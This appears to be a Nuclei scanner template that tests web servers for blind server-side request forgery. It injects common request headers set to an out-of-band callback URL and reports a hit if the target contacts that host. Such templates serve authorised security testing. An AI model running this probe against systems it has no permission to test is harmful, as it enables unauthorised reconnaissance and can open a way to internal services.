id: header-blind-ssrf

info:
  name: Header Blind SSRF
  author: geeknik
  severity: high
  description: Checks for Blind SSR via popular browser headers.

requests:
  - payloads:
      header: helpers/payloads/request-headers.txt

    raw:
      - |
        GET /?§header§ HTTP/1.1
        Host: {{Hostname}}
        §header§: {{interactsh-url}}
        Connection: close

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
